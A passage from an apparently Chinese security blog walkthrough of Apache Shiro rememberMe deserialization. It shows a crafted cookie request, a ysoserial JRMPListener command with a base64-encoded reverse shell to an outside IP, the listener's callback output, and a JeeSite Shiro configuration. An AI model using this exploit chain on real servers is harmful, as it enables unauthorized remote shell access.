+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://underattack-host:8080/login
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: rememberMe=RFUadguvSoq4kMm3ZwnkO/MHiokCrqrCURXUqUWaXLBM7/fBF65qvjWDFZeh49zHDRm5oKPU1AhmbEBaYRp3ASrQpHdp7mYrChOi51tmq9qkzWemDnjbUXtp8B6RF1EUNV2q2tKaKlf4AAR1hZIRJGbz4CpLeumNAeWB98f6/T0GaWJGGve9rP6l9/7iU5Y9Xj4ZmSBP6LgMHYF3TJ2DDdTNI4nPITeQI3S+9ol/BmT14Be5m0ENfOkm1cdm3L8Rj/pbeE842Y3nUioEdAXizCrOsCYT+u2QTWHt1YZLmB/xsfQvEV5bRpRJeRv/ps7V00PiXvCeaPQoDs541wqB75+/RRAdqU8TWnJE7YhvQVkxTRLvCjBTtwfkgA3XVA8X+518nh0wSoj8/Ajaoi5MbA==
+Connection: close
+
+username=asdmnin&amp;password=asdasd&amp;rememberme=remember-me
+</code></pre></div></div>
+<p>使用包监听6666端口：</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@iZj6cgn7odv59wmjjhe6zwZ:/home/tool/shiro_poc/POC-2/ysoserial/target# java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny41Mi4yMzMuOTIvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}'
+* Opening JRMP listener on 6666
+</code></pre></div></div>
+<p>发包，我们看到jrmp监听的端口已经有流量回流回来了，如下：</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Have connection from /underattack-host:58272
+Reading message...
+Is DGC call for [[0:0:0, 356978429], [0:0:0, 2006635131]]
+Sending return with payload for obj [0:0:0, 2]
+Closing connection
+Have connection from /underattack-host:58274
+Reading message...
+Is DGC call for [[0:0:0, 356978429], [0:0:0, -1104978848], [0:0:0, 2006635131]]
+Sending return with payload for obj [0:0:0, 2]
+Closing connection
+</code></pre></div></div>
+
+<h2 id="案例">案例</h2>
+
+<p>/usr/local/nginx/conf/nginx.conf</p>
+
+<p>inet addr:192.168.100.242  Bcast:192.168.100.255  Mask:255.255.255.0</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="c">&lt;!-- Apache Shiro --&gt;</span>
+  <span class="nt">&lt;filter&gt;</span>
+    <span class="nt">&lt;filter-name&gt;</span>shiroFilter<span class="nt">&lt;/filter-name&gt;</span>
+    <span class="nt">&lt;filter-class&gt;</span>org.springframework.web.filter.DelegatingFilterProxy<span class="nt">&lt;/filter-class&gt;</span>
+    <span class="nt">&lt;init-param&gt;</span>
+      <span class="nt">&lt;param-name&gt;</span>targetFilterLifecycle<span class="nt">&lt;/param-name&gt;</span>
+      <span class="nt">&lt;param-value&gt;</span>true<span class="nt">&lt;/param-value&gt;</span>
+    <span class="nt">&lt;/init-param&gt;</span>
+  <span class="nt">&lt;/filter&gt;</span>
+  <span class="nt">&lt;filter-mapping&gt;</span>
+    <span class="nt">&lt;filter-name&gt;</span>shiroFilter<span class="nt">&lt;/filter-name&gt;</span>
+    <span class="nt">&lt;url-pattern&gt;</span>/*<span class="nt">&lt;/url-pattern&gt;</span>
+  <span class="nt">&lt;/filter-mapping&gt;</span>
+
+  <span class="c">&lt;!-- PageCache, cache .html suffix.
+  &lt;filter&gt;
+    &lt;filter-name&gt;PageCacheFilter&lt;/filter-name&gt;
+    &lt;filter-class&gt;com.thinkgem.jeesite.common.filter.PageCachingFilter&lt;/filter-class&gt;
+  &lt;/filter&gt;
+  &lt;filter-mapping&gt;
+    &lt;filter-name&gt;PageCacheFilter&lt;/filter-name&gt;
+    &lt;url-pattern&gt;/&lt;/url-pattern&gt;
+  &lt;/filter-mapping&gt;
+  &lt;filter-mapping&gt;
+    &lt;filter-name&gt;PageCacheFilter&lt;/filter-name&gt;
+    &lt;url-pattern&gt;*.html&lt;/url-pattern&gt;
+  &lt;/filter-mapping&gt;--&gt;</span>
+
+  <span class="c">&lt;!-- SiteMesh --&gt;</span>
+  <span class="nt">&lt;filter&gt;</span>
+    <span class="nt">&lt;filter-name&gt;</span>sitemeshFilter<span class="nt">&lt;/filter-name&gt;</span>
+    <span class="nt">&lt;filter-class&gt;</span>com.opensymphony.sitemesh.webapp.SiteMeshFilter<span class="nt">&lt;/filter-class&gt;</span>
+  <span class="nt">&lt;/filter&gt;</span>
+  <span class="nt">&lt;filter-mapping&gt;</span>
+    <span class="nt">&lt;filter-name&gt;</span>sitemeshFilter<span class="nt">&lt;/filter-name&gt;</span>
+    <span class="nt">&lt;url-pattern&gt;</span>/a/*<span class="nt">&lt;/url-pattern&gt;</span>
+  <span class="nt">&lt;/filter-mapping&gt;</span>
+  <span class="nt">&lt;filter-mapping&gt;</span>
+    <span class="nt">&lt;filter-name&gt;</span>sitemeshFilter<span class="nt">&lt;/filter-name&gt;</span>
+    <span class="nt">&lt;url-pattern&gt;</span>/f/*<span class="nt">&lt;/url-pattern&gt;</span>
+  <span class="nt">&lt;/filter-mapping&gt;</span>
+</code></pre></div></div>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="nt">&lt;beans</span> <span class="na">xmlns=</span><span class="s">"http://www.springframework.org/schema/beans"</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span>
+  <span class="na">xmlns:context=</span><span class="s">"http://www.springframework.org/schema/context"</span> <span class="na">xsi:schemaLocation=</span><span class="s">"
+    http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.0.xsd
+    http://www.springframework.org/schema/context  http://www.springframework.org/schema/context/spring-context-4.0.xsd"</span>
+  <span class="na">default-lazy-init=</span><span class="s">"true"</span><span class="nt">&gt;</span>
+
+  <span class="nt">&lt;description&gt;</span>Shiro Configuration<span class="nt">&lt;/description&gt;</span>
+
+    <span class="c">&lt;!-- 加载配置属性文件 --&gt;</span>
+  <span class="nt">&lt;context:property-placeholder</span> <span class="na">ignore-unresolvable=</span><span class="s">"true"</span> <span class="na">location=</span><span class="s">"classpath:jeesite.properties"</span> <span class="nt">/&gt;</span>
+  
+  <span class="c">&lt;!-- Shiro权限过滤过滤器定义 --&gt;</span>
+  <span class="nt">&lt;bean</span> <span class="na">name=</span><span class="s">"shiroFilterChainDefinitions"</span> <span class="na">class=</span><span class="s">"java.lang.String"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;constructor-arg&gt;</span>
+      <span class="nt">&lt;value&gt;</span>
+        /static/** = anon
+        /userfiles/** = anon
+        ${adminPath}/cas = cas
+        ${adminPath}/login = authc
+        ${adminPath}/isValidateKlp = anon
+        ${adminPath}/queryLoingname = anon
+        ${adminPath}/ukeyIsExist = anon
+        ${adminPath}/validSlider/** = anon
+        ${adminPath}/dataInterface/** = anon
+        ${adminPath}/sys/forget/** = anon<span class="c">&lt;!-- 登录页忘记密码 --&gt;</span>
+        ${adminPath}/logout = logout
+        ${adminPath}/** = user
+        /act/rest/service/editor/** = perms[act:model:edit]
+        /act/rest/service/model/** = perms[act:model:edit]
+        /act/rest/service/** = user
+        /ReportServer/** = user
+        
+        ${mobilePath}/** = anon
+      <span class="nt">&lt;/value&gt;</span>
+    <span class="nt">&lt;/constructor-arg&gt;</span>
+  <span class="nt">&lt;/bean&gt;</span>
+  
+  <span class="c">&lt;!-- 安全认证过滤器 --&gt;</span>
+  <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">"shiroFilter"</span> <span class="na">class=</span><span class="s">"org.apache.shiro.spring.web.ShiroFilterFactoryBean"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"securityManager"</span> <span class="na">ref=</span><span class="s">"securityManager"</span> <span class="nt">/&gt;</span><span class="c">&lt;!-- 
+    &lt;property name="loginUrl" value="${cas.server.url}?service=${cas.project.url}${adminPath}/cas" /&gt; --&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"loginUrl"</span> <span class="na">value=</span><span class="s">"${adminPath}/login"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"successUrl"</span> <span class="na">value=</span><span class="s">"${adminPath}?login"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"filters"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;map&gt;</span>
+                <span class="nt">&lt;entry</span> <span class="na">key=</span><span class="s">"cas"</span> <span class="na">value-ref=</span><span class="s">"casFilter"</span><span class="nt">/&gt;</span>
+                <span class="nt">&lt;entry</span> <span class="na">key=</span><span class="s">"authc"</span> <span class="na">value-ref=</span><span class="s">"formAuthenticationFilter"</span><span class="nt">/&gt;</span>
+            <span class="nt">&lt;/map&gt;</span>
+        <span class="nt">&lt;/property&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"filterChainDefinitions"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;ref</span> <span class="na">bean=</span><span class="s">"shiroFilterChainDefinitions"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;/property&gt;</span>
+  <span class="nt">&lt;/bean&gt;</span>
+  
+  <span class="c">&lt;!-- CAS认证过滤器 --&gt;</span>  
+  <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">"casFilter"</span> <span class="na">class=</span><span class="s">"org.apache.shiro.cas.CasFilter"</span><span class="nt">&gt;</span>  
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"failureUrl"</span> <span class="na">value=</span><span class="s">"${adminPath}/login"</span><span class="nt">/&gt;</span>
+  <span class="nt">&lt;/bean&gt;</span>
+  
+  <span class="c">&lt;!-- 定义Shiro安全管理配置 --&gt;</span>
+  <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">"securityManager"</span> <span class="na">class=</span><span class="s">"org.apache.shiro.web.mgt.DefaultWebSecurityManager"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"realm"</span> <span class="na">ref=</span><span class="s">"systemAuthorizingRealm"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"sessionManager"</span> <span class="na">ref=</span><span class="s">"sessionManager"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"cacheManager"</span> <span class="na">ref=</span><span class="s">"shiroCacheManager"</span> <span class="nt">/&gt;</span>
+  <span class="nt">&lt;/bean&gt;</span>
+  
+  <span class="c">&lt;!-- 自定义会话管理配置 --&gt;</span>
+  <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">"sessionManager"</span> <span class="na">class=</span><span class="s">"com.thinkgem.jeesite.common.security.shiro.session.SessionManager"</span><span class="nt">&gt;</span> 
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"sessionDAO"</span> <span class="na">ref=</span><span class="s">"sessionDAO"</span><span class="nt">/&gt;</span>
+    
+    <span class="c">&lt;!-- 会话超时时间，单位：毫秒  --&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"globalSessionTimeout"</span> <span class="na">value=</span><span class="s">"${session.sessionTimeout}"</span><span class="nt">/&gt;</span>
+    
+    <span class="c">&lt;!-- 定时清理失效会话, 清理用户直接关闭浏览器造成的孤立会话   --&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"sessionValidationInterval"</span> <span class="na">value=</span><span class="s">"${session.sessionTimeoutClean}"</span><span class="nt">/&gt;</span>
+<span class="c">&lt;!--      &lt;property name="sessionValidationSchedulerEnabled" value="false"/&gt; --&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"sessionValidationSchedulerEnabled"</span> <span class="na">value=</span><span class="s">"true"</span><span class="nt">/&gt;</span>
+    
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"sessionIdCookie"</span> <span class="na">ref=</span><span class="s">"sessionIdCookie"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"sessionIdCookieEnabled"</span> <span class="na">value=</span><span class="s">"true"</span><span class="nt">/&gt;</span>
+  <span class="nt">&lt;/bean&gt;</span>
+  
+  <span class="c">&lt;!-- 指定本系统SESSIONID, 默认为: JSESSIONID 问题: 与SERVLET容器名冲突, 如JETTY, TOMCAT 等默认JSESSIONID,
+    当跳出SHIRO SERVLET时如ERROR-PAGE容器会为JSESSIONID重新分配值导致登录会话丢失! --&gt;</span>
+  <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">"sessionIdCookie"</span> <span class="na">class=</span><span class="s">"org.apache.shiro.web.servlet.SimpleCookie"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;constructor-arg</span> <span class="na">name=</span><span class="s">"name"</span> <span class="na">value=</span><span class="s">"jeesite.session.id"</span><span class="nt">/&gt;</span>
+      <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"path"</span> <span class="na">value=</span><span class="s">"/"</span> <span class="nt">/&gt;</span>
+  <span class="nt">&lt;/bean&gt;</span>
+
+  <span class="c">&lt;!-- 自定义Session存储容器 --&gt;</span>
+  <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">"sessionDAO"</span> <span class="na">class=</span><span class="s">"com.thinkgem.jeesite.common.security.shiro.session.JedisSessionDAO"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"sessionIdGenerator"</span> <span class="na">ref=</span><span class="s">"idGen"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"sessionKeyPrefix"</span> <span class="na">value=</span><span class="s">"${redis.keyPrefix}:user:session_"</span> <span class="nt">/&gt;</span>
+  <span class="nt">&lt;/bean&gt;</span> 
+  <span class="c">&lt;!--&lt;bean id="sessionDAO" class="com.thinkgem.jeesite.common.security.shiro.session.CacheSessionDAO"&gt;
+    &lt;property name="sessionIdGenerator" ref="idGen" /&gt;
+    &lt;property name="activeSessionsCacheName" value="activeSessionsCache" /&gt;
+    &lt;property name="cacheManager" ref="shiroCacheManager" /&gt;
+  &lt;/bean&gt;--&gt;</span>
+  
+  <span class="c">&lt;!-- 定义授权缓存管理器 --&gt;</span>
+<span class="c">&lt;!--  &lt;bean id="shiroCacheManager" class="com.thinkgem.jeesite.common.security.shiro.cache.SessionCacheManager" /&gt; --&gt;</span>
+  <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">"shiroCacheManager"</span> <span class="na">class=</span><span class="s">"org.apache.shiro.cache.ehcache.EhCacheManager"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"cacheManager"</span> <span class="na">ref=</span><span class="s">"cacheManager"</span><span class="nt">/&gt;</span>
+  <span class="nt">&lt;/bean&gt;</span>
+  
+  <span class="c">&lt;!-- 保证实现了Shiro内部lifecycle函数的bean执行 --&gt;</span>
+  <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">"lifecycleBeanPostProcessor"</span> <span class="na">class=</span><span class="s">"org.apache.shiro.spring.LifecycleBeanPostProcessor"</span><span class="nt">/&gt;</span>
+  
+  <span class="c">&lt;!-- AOP式方法级权限检查  --&gt;</span>
+  <span class="nt">&lt;bean</span> <span class="na">class=</span><span class="s">"org.springframework.aop.framework.autoproxy.DefaultAdvisorAutoProxyCreator"</span> <span class="na">depends-on=</span><span class="s">"lifecycleBeanPostProcessor"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"proxyTargetClass"</span> <span class="na">value=</span><span class="s">"true"</span> <span class="nt">/&gt;</span>
+  <span class="nt">&lt;/bean&gt;</span>
+  <span class="nt">&lt;bean</span> <span class="na">class=</span><span class="s">"org.apache.shiro.spring.security.interceptor.AuthorizationAttributeSourceAdvisor"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"securityManager"</span> <span class="na">ref=</span><span class="s">"securityManager"</span><span class="nt">/&gt;</span>
+  <span class="nt">&lt;/bean&gt;</span>
+  
+<span class="nt">&lt;/beans&gt;</span>
+</code></pre></div></div>
+
+<p>以上。</p>
+
+
+				</div>
+				<div class="spacing"></div>
+	            <div>
+	<div class="hline"></div>
+	<h3><em>#</em> 申明</h3>
+	<div class="spacing"></div>
+	<h4><em>By: Bin4xin.</em></h4>
+	<h4>转载请申明本文链接：<a href="/help/ShiroDeser/" target="_blank"><code-index-css>《<em>Shirodeser</em>》</code-index-css></a></h4>
+
+	<h3><em># Any Questions</em></h3>
+	<div class="spacing"></div>
+	<h4> >_ 对本文进行提问：<a href="https://github.com/Bin4xin/bin4xin.github.io/issues/new?permalink=https://github.com/Bin4xin/bin4xin.github.io/blob/1b4fffa6232dc6ffa2cece8be0d6c39e0c5f9cfe/help/ShiroDeser/index.html%23L84" target="_blank"> <em><li class="fa fa-github"></li> Reference in new issue.</em></a></h4>
+
+	<h4> >_ 对本文进行留言：<a href="https://github.com/Bin4xin/bin4xin.github.io/issues/new?permalink=https://about.sentrylab.cn/help/ShiroDeser/" target="_blank"> <em><li class="fa fa-github"></li> Leave a Comment.</em></a></h4>
+</div>
+			</div><!-- help content -->
+	  </div>
+	</div><!--/container -->
+</div><!--/mirrors -->
+	
+
+
+<div id="footerwrap" class="tuna-foot-1">
+<div class="container">
+    <div class="row">
+            <div class="col-sm-4">
+                <div class="col-sm-6">
+                  <p class="thuhidden"><strong>入门</strong></p>
+                  <p class="thuhidden"><a href="https://github.com/tuna/mirror-web" target="blank"><em>Jekyll</em>源码</a></p>
+                  <p class="thuhidden"><a href="https://www.sentrylab.cn/blog/2019/jekyll/in/linux/" target="blank">博客搭建教程</a></p>
+                  <p class="thuhidden"><a href="https://about.sentrylab.cn/news/sentry-lab-markdown-usage/" target="blank">个性化语法批注</a></p>
+                  <p class="thuhidden"><a href="https://www.sentrylab.cn/blog/2019/nginx/with/jekyll-site/" target="blank">公网部署</a></p>
+                  </div>
+
+                  <div class="col-sm-6">
+                  <p class="thuhidden"><strong>社区</strong></p>
+                  <p class="thuhidden"><a href="/blog" target="blank">博客</a></p>
+                  <p class="thuhidden"><a href="https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV" target="blank"><em>Collection of verified vulnerabilities</em></a></p>
+                  <p class="thuhidden"><a href="https://github.com/Bin4xin/bigger-than-bigger" target="blank"><em>Bigger than Bigger</em></a></p>
+                  <p class="thuhidden"><a href="https://github.com/Bin4xin/B4xinSynchronize" target="blank"><em>B4xinSynchronize</em></a></p>
+                  </div>
+            </div>
+
+            <div class="col-sm-4">
+                  <div class="col-sm-6">
+                    <p class="thuhidden"><strong>开发</strong></p>
+                    <p class="thuhidden"><a href="https://github.com/Bin4xin/Bin4xin" target="blank"><em>Bin4xin</em></a></p>
+                    <p class="thuhidden"><a href="https://www.cloudflare.com/waf/" target="blank"><em>CloudFlare WAF</em></a></p>
+                    <p class="thuhidden"><a href="https://jekyllrb.com/docs/" target="blank"><em>Jekyll</em></a></p>
+                    <p class="thuhidden"><a href="https://www.markdownguide.org/" target="blank"><em>MarkDown</em></a></p>
+                    <p class="share">
+                    <a href="https://github.com/Bin4xin/" target="blank"><i class="fa fa-github"></i></a>
+                    <a href="https://twitter.com/Bin4xin/"><i class="fa fa-twitter" target="blank"></i></a>
+                    <a href="#"><i class="fa fa-facebook" target="blank"></i></a>
+                    </p>
+                  </div>
+
+                  <div class="col-sm-6">
+                    <p class="thuhidden"><strong>关于</strong></p>
+                    <p class="thuhidden"><a href="https://about.sentrylab.cn/" target="blank">近期研究</a></p>
+                    <p class="thuhidden">∑ <csmall>(Visitors/times)</csmall></em></p>
+                    <img src="https://profile-counter.glitch.me/bin4xin.github.io/count.svg" style="max-width:100%;">
+                  </div>
+            </div>
+
+        <div class="col-sm-4">
+          
+          <img src="/static/img/logo-small@3x.png" />
+
+        </div>
+    </div><!--/row -->
+    
+    <p class="thuhidden">© 2019-2021 SentrySec, Lab. Build by Jekyll under the terms of the MIT License.</p>
+
+  </div>
+</div>
+
+
+
+
+<div id="footerwrap" class="tuna-foot-2">
+<div class="container">
+    <div class="row">
+            <div class="col-sm-4">
+                <div class="col-sm-6">
+                  <p class="thuhidden"><strong>入门</strong></p>
+                  <p class="thuhidden"><a href="https://github.com/tuna/mirror-web" target="blank"><em>Jekyll</em>源码</a></p>
+                  <p class="thuhidden"><a href="https://www.sentrylab.cn/blog/2019/jekyll/in/linux/" target="blank">博客搭建教程</a></p>
+                  <p class="thuhidden"><a href="https://about.sentrylab.cn/news/sentry-lab-markdown-usage/" target="blank">个性化语法批注</a></p>
+                  <p class="thuhidden"><a href="https://www.sentrylab.cn/blog/2019/nginx/with/jekyll-site/" target="blank">公网部署</a></p>
+                  </div>
+
+                  <div class="col-sm-6">
+                  <p class="thuhidden"><strong>社区</strong></p>
+                  <p class="thuhidden"><a href="/blog" target="blank">博客</a></p>
+                  <p class="thuhidden"><a href="https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV" target="blank"><em>Collection of verified vulnerabilities</em></a></p>
+                  <p class="thuhidden"><a href="https://github.com/Bin4xin/bigger-than-bigger" target="blank"><em>Bigger than Bigger</em></a></p>
+                  <p class="thuhidden"><a href="https://github.com/Bin4xin/B4xinSynchronize" target="blank"><em>B4xinSynchronize</em></a></p>
+                  </div>
+            </div>
+
+            <div class="col-sm-4">
+                  <div class="col-sm-6">
+                    <p class="thuhidden"><strong>开发</strong></p>
+                    <p class="thuhidden"><a href="https://github.com/Bin4xin/Bin4xin" target="blank"><em>Bin4xin</em></a></p>
+                    <p class="thuhidden"><a href="https://www.cloudflare.com/waf/" target="blank"><em>CloudFlare WAF</em></a></p>
+                    <p class="thuhidden"><a href="https://jekyllrb.com/docs/" target="blank"><em>Jekyll</em></a></p>
+                    <p class="thuhidden"><a href="https://www.markdownguide.org/" target="blank"><em>MarkDown</em></a></p>
+                    <p class="share">
+                    <a href="https://github.com/Bin4xin/" target="blank"><i class="fa fa-github"></i></a>
+                    <a href="https://twitter.com/Bin4xin/"><i class="fa fa-twitter" target="blank"></i></a>
+                    <a href="#"><i class="fa fa-facebook" target="blank"></i></a>
+                    </p>
+                  </div>
+
+                  <div class="col-sm-6">
+                    <p class="thuhidden"><strong>关于</strong></p>
+                    <p class="thuhidden"><a href="https://about.sentrylab.cn/" target="blank">近期研究</a></p>
+                    <p class="thuhidden">∑ <csmall>(Visitors/times)</csmall></em></p>
+                    <img src="https://profile-counter.glitch.me/bin4xin.github.io/count.svg" style="max-width:100%;">
+                  </div>
+            </div>
+
+        <div class="col-sm-4">
+          
+          <img src="/static/img/logo-small@3x.png" />
+
+        </div>
+    </div><!--/row -->
+    
+    <p class="thuhidden">© 2019-2021 SentrySec, Lab. Build by Jekyll under the terms of the MIT License.</p>
+
+  </div>
+</div>
+
+
+</body>
+
+<script src="/static/js/help.js"></script>
+</html>
+<!--
+vim: ts=2 sts=2 sw=2 noexpandtab
+-->
